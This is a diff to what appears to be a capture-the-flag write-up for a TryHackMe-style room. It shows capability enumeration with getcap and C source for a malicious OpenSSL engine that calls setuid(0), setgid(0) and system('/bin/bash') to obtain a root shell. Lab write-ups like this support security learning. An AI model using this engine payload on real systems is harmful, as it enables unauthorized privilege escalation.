@@ -116,7 +116,7 @@ thm{******38247ff441ce4e13**********}
 
 `getcap -r / 2>/dev/null`
 
-`
+
 /usr/bin/mtr-packet = cap_net_raw+ep
 
 
@@ -124,7 +124,7 @@ thm{******38247ff441ce4e13**********}
 
 
 /home/mindgames/webserver/server = cap_net_bind_service+ep
-`
+
 
 + the openssl capability strikes me as interesting. After a bit of research I discover it is vulnerable to privilege escalation
 
@@ -146,19 +146,16 @@ thm{******38247ff441ce4e13**********}
 
 static int bind(ENGINE *e, const char *id) {
 
-
-    setuid(0); setgid(0);
-
+    setuid(0); 
+    
+    setgid(0);
     
     system("/bin/bash");
 
     
 }
 
-
-
 IMPLEMENT_DYNAMIC_BIND_FN(bind)
-
 
 IMPLEMENT_DYNAMIC_CHECK_FN()"
 `
